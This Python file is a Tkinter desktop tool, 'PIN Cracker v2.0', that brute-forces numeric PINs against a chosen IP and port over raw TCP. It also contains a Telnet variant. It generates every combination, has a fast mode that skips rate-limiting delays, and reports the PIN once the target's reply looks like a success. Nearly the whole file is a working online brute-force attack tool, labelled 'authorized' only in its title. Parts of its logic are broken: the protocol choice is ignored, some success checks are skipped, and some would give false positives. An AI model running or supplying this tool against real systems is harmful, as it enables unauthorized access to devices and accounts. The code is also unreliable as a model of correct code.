import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import socket
from concurrent.futures import ThreadPoolExecutor
import hashlib
import struct

class PINCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("PIN Cracker v2.0 - Authorized Pentest Tool")
        self.root.geometry("900x750")
        self.root.resizable(True, True)
        
        self.is_running = False
        self.executor = ThreadPoolExecutor(max_workers=100)
        self.start_time = 0
        self.attempts = 0
        
        self.setup_gui()
    
    def setup_gui(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Target Configuration
        target_frame = ttk.LabelFrame(main_frame, text="🎯 Target Configuration", padding="12")
        target_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0,15))
        target_frame.columnconfigure(1, weight=1)
        
        ttk.Label(target_frame, text="Target IP/Hostname:").grid(row=0, column=0, sticky=tk.W)
        self.target_entry = ttk.Entry(target_frame, width=25, font=('Consolas', 10))
        self.target_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(8,10))
        self.target_entry.insert(0, "192.168.1.1")
        
        ttk.Label(target_frame, text="Port:").grid(row=0, column=2, sticky=tk.W, padx=(20,0))
        self.port_entry = ttk.Entry(target_frame, width=8)
        self.port_entry.insert(0, "23")
        self.port_entry.grid(row=0, column=3, padx=(5,0))
        
        ttk.Label(target_frame, text="Protocol:").grid(row=1, column=0, sticky=tk.W, pady=(12,0))
        self.protocol_var = tk.StringVar(value="Telnet")
        protocol_combo = ttk.Combobox(target_frame, textvariable=self.protocol_var,
                                    values=["Telnet", "SSH", "HTTP Basic", "Custom TCP"], 
                                    state="readonly", width=12)
        protocol_combo.grid(row=1, column=1, sticky=tk.W, pady=(12,0), padx=(8,10))
        
        # PIN Settings
        pin_frame = ttk.LabelFrame(main_frame, text="🔢 PIN Configuration", padding="12")
        pin_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0,15))
        pin_frame.columnconfigure(1, weight=1)
        
        ttk.Label(pin_frame, text="PIN Length:").grid(row=0, column=0, sticky=tk.W)
        self.pin_length_var = tk.IntVar(value=4)
        length_spin = ttk.Spinbox(pin_frame, from_=1, to=12, textvariable=self.pin_length_var, width=8)
        length_spin.grid(row=0, column=1, sticky=tk.W, padx=(8,10))
        
        ttk.Label(pin_frame, text="Character Set:").grid(row=0, column=2, sticky=tk.W, padx=(20,0))
        self.charset_var = tk.StringVar(value="0123456789")
        charset_combo = ttk.Combobox(pin_frame, textvariable=self.charset_var,
                                   values=["0123456789", "0123456789*", "0123456789#", "0123456789*#"],
                                   state="readonly", width=12)
        charset_combo.grid(row=0, column=3, sticky=tk.W, padx=(5,0))
        
        self.custom_charset_entry = ttk.Entry(pin_frame, width=15, font=('Consolas', 10))
        self.custom_charset_entry.grid(row=1, column=1, columnspan=2, sticky=tk.W, pady=(8,0), padx=(8,10))
        self.custom_charset_entry.insert(0, "0123456789")
        
        # Attack Options
        options_frame = ttk.LabelFrame(main_frame, text="⚡ Attack Options", padding="12")
        options_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0,15))
        
        self.fast_mode_var = tk.BooleanVar()
        ttk.Checkbutton(options_frame, text="Fast Mode (Skip delays)", variable=self.fast_mode_var).grid(row=0, column=0, sticky=tk.W)
        
        self.brute_force_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Brute Force All Combinations", variable=self.brute_force_var).grid(row=0, column=1, sticky=tk.W, padx=(20,0))
        
        ttk.Label(options_frame, text="Delay (ms):").grid(row=1, column=0, sticky=tk.W, pady=(8,0))
        self.delay_var = tk.DoubleVar(value=50)
        delay_spin = ttk.Spinbox(options_frame, from_=0, to=1000, increment=10, textvariable=self.delay_var, width=8)
        delay_spin.grid(row=1, column=1, sticky=tk.W, padx=(8,0), pady=(8,0))
        
        # Progress Dashboard
        progress_frame = ttk.LabelFrame(main_frame, text="📊 Progress Dashboard", padding="12")
        progress_frame.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0,15))
        progress_frame.columnconfigure(0, weight=1)
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, maximum=100, mode='determinate')
        self.progress_bar.grid(row=0, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(0,10))
        
        stats_frame = ttk.Frame(progress_frame)
        stats_frame.grid(row=1, column=0, columnspan=3, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Attempts:").grid(row=0, column=0, padx=(0,10))
        self.attempts_label = ttk.Label(stats_frame, text="0", font=('Consolas', 10, 'bold'))
        self.attempts_label.grid(row=0, column=1)
        
        ttk.Label(stats_frame, text="Speed:").grid(row=0, column=2, padx=(20,10))
        self.speed_label = ttk.Label(stats_frame, text="0 PIN/s", font=('Consolas', 10, 'bold'))
        self.speed_label.grid(row=0, column=3)
        
        ttk.Label(stats_frame, text="ETA:").grid(row=0, column=4, padx=(20,10))
        self.eta_label = ttk.Label(stats_frame, text="--:--:--", font=('Consolas', 10, 'bold'))
        self.eta_label.grid(row=0, column=5)
        
        ttk.Label(stats_frame, text="Current:").grid(row=1, column=0, pady=(5,0), padx=(0,10))
        self.current_pin_label = ttk.Label(stats_frame, text="----", font=('Consolas', 10))
        self.current_pin_label.grid(row=1, column=1, pady=(5,0))
        
        # Control Panel
        control_frame = ttk.Frame(main_frame)
        control_frame.grid(row=4, column=0, columnspan=2, pady=15)
        
        self.start_btn = ttk.Button(control_frame, text="🚀 START CRACKING", command=self.start_crack,
                                  style="Accent.TButton")
        self.start_btn.pack(side=tk.LEFT, padx=(0,15), ipadx=20)
        
        self.stop_btn = ttk.Button(control_frame, text="⏹️ STOP", command=self.stop_crack, state="disabled")
        self.stop_btn.pack(side=tk.LEFT, ipadx=20)
        
        ttk.Button(control_frame, text="🗑️ Clear Log", command=self.clear_log).pack(side=tk.LEFT, padx=(15,0), ipadx=20)
        
        # Results Log
        results_frame = ttk.LabelFrame(main_frame, text="📝 Results Log", padding="10")
        results_frame.grid(row=5, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0,10))
        
        self.log_text = scrolledtext.ScrolledText(results_frame, height=18, font=('Consolas', 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(5, weight=1)
        target_frame.columnconfigure(1, weight=1)
        pin_frame.columnconfigure(1, weight=1)
        progress_frame.columnconfigure(0, weight=1)
    
    def generate_pins(self):
        """Generator for PIN combinations"""
        charset = self.charset_var.get()
        length = self.pin_length_var.get()
        
        if self.custom_charset_entry.get().strip():
            charset = self.custom_charset_entry.get().strip()
        
        total_pins = len(charset) ** length
        self.log(f"Generated {total_pins:,} possible PINs (charset '{charset}', length {length})")
        
        if self.brute_force_var.get():
            # Brute force all combinations
            from itertools import product
            for combo in product(charset, repeat=length):
                if not self.is_running:
                    break
                yield ''.join(combo)
        else:
            # Sequential only (faster for testing)
            for i in range(total_pins):
                if not self.is_running:
                    break
                pin = f"{i:0{length}d}"
                yield pin.zfill(length)
    
    def test_telnet_pin(self, pin):
        """Test PIN over Telnet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target_entry.get(), int(self.port_entry.get())))
            
            # Read initial banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Send PIN (common telnet PIN prompt patterns)
            sock.send(f"{pin}\n".encode())
            time.sleep(0.1)
            
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            # Success indicators
            success_indicators = ['>', '$', '#', '>', 'root@', 'admin@', 'Login successful']
            for indicator in success_indicators:
                if indicator in response:
                    return True
            return False
            
        except:
            return False
    
    def test_tcp_pin(self, pin):
        """Generic TCP PIN tester"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target_entry.get(), int(self.port_entry.get())))
            
            sock.send(f"{pin}\r\n".encode())
            time.sleep(0.05 if self.fast_mode_var.get() else 0.1)
            
            response = sock.recv(1024)
            sock.close()
            
            # Check for success patterns in binary response
            success_bytes = [0x00, 0x01, b'OK', b'SUCCESS']
            for pattern in success_bytes:
                if isinstance(pattern, bytes) and pattern in response:
                    return True
            return False
        except:
            return False
    
    def crack_worker(self):
        """Main cracking worker"""
        self.start_time = time.time()
        pin_gen = self.generate_pins()
        total_pins = len(self.charset_var.get()) ** self.pin_length_var.get()
        
        for pin in pin_gen:
            if not self.is_running:
                break
                
            self.attempts += 1
            success = self.test_tcp_pin(pin)  # Default to TCP for most PIN devices
            
            # Update GUI
            self.root.after(0, self.update_stats, pin, total_pins)
            
            if success:
                self.root.after(0, lambda p=pin: self.pin_found(p))
                break
            
            # Rate limiting
            if not self.fast_mode_var.get():
                time.sleep(self.delay_var.get() / 1000)
        
        self.root.after(0, self.crack_finished)
    
    def update_stats(self, current_pin, total_pins):
        """Update progress statistics"""
        progress = min((self.attempts / total_pins) * 100, 100)
        self.progress_var.set(progress)
        self.current_pin_label.config(text=current_pin)
        self.attempts_label.config(text=f"{self.attempts:,}")
        
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            speed = self.attempts / elapsed
            self.speed_label.config(text=f"{speed:.1f} PIN/s")
            
            if self.attempts > 10 and speed > 0:
                eta_seconds = ((total_pins - self.attempts) / speed)
                eta_str = time.strftime("%H:%M:%S", time.gmtime(eta_seconds))
                self.eta_label.config(text=eta_str)
    
    def pin_found(self, pin):
        """Handle successful PIN discovery"""
        self.log(f"🎉 PIN CRACKED! PIN: {pin}", "green")
        messagebox.showinfo("PIN CRACKED!", f"SUCCESS!\n\nTarget: {self.target_entry.get()}:{self.port_entry.get()}\nPIN: **{pin}**\n\nSave this for your pentest report!")
        self.stop_crack()
    
    def crack_finished(self):
        """Handle crack completion"""
        self.log("✅ Crack completed or stopped.", "blue")
    
    def start_crack(self):
        """Start the cracking process"""
        if not self.target_entry.get() or not self.port_entry.get().isdigit():
            messagebox.showerror("Error", "Please set valid target IP and port!")
            return
        
        self.is_running = True
        self.attempts = 0
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.progress_var.set(0)
        
        # Start in background thread
        self.executor.submit(self.crack_worker)
        self.log(f"🚀 Starting PIN crack on {self.target_entry.get()}:{self.port_entry.get()}")
        self.log(f"Protocol: {self.protocol_var.get()} | Length: {self.pin_length_var.get()} | Charset: {self.charset_var.get()}")
    
    def stop_crack(self):
        """Stop the cracking process"""
        self.is_running = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log("⏹️ Crack stopped by user.")
    
    def log(self, message, color="black"):
        """Add message to log with timestamp and color"""
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        
        # Color coding
        start_idx = f"end - {len(message)+10}l"
        end_idx = "end - 1l"
        self.log_text.tag_add(color, start_idx, end_idx)
        self.log_text.tag_config("green", foreground="#00ff00")
        self.log_text.tag_config("blue", foreground="#0099ff")
        self.log_text.tag_config("orange", foreground="#ff9900")
    
    def clear_log(self):
        """Clear the log"""
        self.log_text.delete(1.0, tk.END)

def main():
    root = tk.Tk()
    app = PINCrackerGUI(root)
    
    # Make it look professional
    style = ttk.Style()
    style.configure("Accent.TButton", font=('Arial', 10, 'bold'))
    
    root.mainloop()

if __name__ == "__main__":
    main()
